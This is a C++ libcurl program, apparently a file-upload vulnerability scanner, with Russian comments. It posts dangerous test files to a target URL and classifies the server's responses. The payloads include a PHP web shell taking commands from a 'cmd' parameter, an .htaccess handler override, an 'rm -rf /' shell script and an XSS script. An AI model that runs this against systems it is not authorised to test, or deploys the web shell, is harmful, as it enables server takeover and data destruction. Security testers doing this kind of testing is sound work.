#include <iostream>
#include <string>
#include <vector>
#include <curl/curl.h>

static size_t WriteCallback(void* contents, size_t size, size_t nmemb, std::string* output) {
    size_t total_size = size * nmemb;
    output->append((char*)contents, total_size);
    return total_size;
}



void upload_file(const std::string& url) {
    // Тестовые случаи: различные опасные типы файлов
    std::vector<std::pair<std::string, std::string>> test_cases = {
        {"exploit.php", "<?php system($_GET['cmd']); ?>"},
        {".htaccess", "SetHandler application/x-httpd-php\n"},
        {"test.jpg.php", "<?php echo 'VULNERABLE!'; ?>"},
        {"test.php.", "<?php echo 'DOT_VULN!'; ?>"},
        {"test.exe", "MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00"},
        {"test.sh", "#!/bin/bash\nrm -rf /"},
        {"test.html", "<script>alert('XSS')</script>"}
    };

    std::cout << "Начинаем тестирование уязвимостей загрузки файлов...\n\n";

    for (const auto& [filename, content] : test_cases) {
        CURL* curl = curl_easy_init();
        if (!curl) {
            std::cerr << "Ошибка инициализации cURL\n";
            continue;
        }



        std::string response;
        std::cout << "Попытка загрузки: " << filename << "\n";

        // Настройка запроса
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_POST, 1L);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 15L);
        curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, 5L);

        // Настройка MIME данных
        curl_mime* mime = curl_mime_init(curl);
        curl_mimepart* part = curl_mime_addpart(mime);
        curl_mime_name(part, "file");
        curl_mime_filename(part, filename.c_str());
        curl_mime_data(part, content.c_str(), content.size());
        curl_easy_setopt(curl, CURLOPT_MIMEPOST, mime);

        // Выполнение запроса
        CURLcode res = curl_easy_perform(curl);
        long response_code = 0;
        if (res == CURLE_OK) {
            curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);
        }



        // Анализ результатов
        if (res != CURLE_OK) {
            std::cerr << "  Ошибка: " << curl_easy_strerror(res) << "\n";
        } else if (response_code >= 200 && response_code < 300) {
            std::cout << "  УСПЕШНАЯ ЗАГРУЗКА! Код: " << response_code << "\n";
            
            // Проверка типа уязвимости по расширению файла
            if (filename.find(".php") != std::string::npos) {
                std::cout << "  [КРИТИЧЕСКАЯ] Обнаружена уязвимость загрузки PHP-файлов\n";
            }
            else if (filename == ".htaccess") {
                std::cout << "  [КРИТИЧЕСКАЯ] Обнаружена уязвимость загрузки .htaccess\n";
            }
            else if (filename.find(".exe") != std::string::npos) {
                std::cout << "  [ВЫСОКИЙ РИСК] Обнаружена уязвимость загрузки исполняемых файлов\n";
            }
            else if (filename.find(".sh") != std::string::npos) {
                std::cout << "  [ВЫСОКИЙ РИСК] Обнаружена уязвимость загрузки shell-скриптов\n";
            }
            else if (filename.find(".html") != std::string::npos) {
                std::cout << "  [СРЕДНИЙ РИСК] Обнаружена уязвимость загрузки HTML-файлов\n";
            }
            else {
                std::cout << "  [РИСК] Сервер принимает неизвестные типы файлов\n";
            }

            // Проверка на прямое выполнение кода
            if (filename.find(".php") != std::string::npos &&
                response.find("VULNERABLE") != std::string::npos) {
                std::cout << "  [КРИТИЧЕСКАЯ] PHP-файл выполняется на сервере!\n";
            }
        } else {
            std::cout << "  Загрузка отклонена. Код: " << response_code << "\n";
        }



        // Проверка на XSS в ответе сервера
        if (response.find("<script>") != std::string::npos ||
            response.find("alert(") != std::string::npos) {
            std::cout << "  [XSS] Обнаружен потенциальный XSS в ответе сервера\n";
        }

        std::cout << std::endl;
        curl_mime_free(mime);
        curl_easy_cleanup(curl);
    }
}

//dfdfdf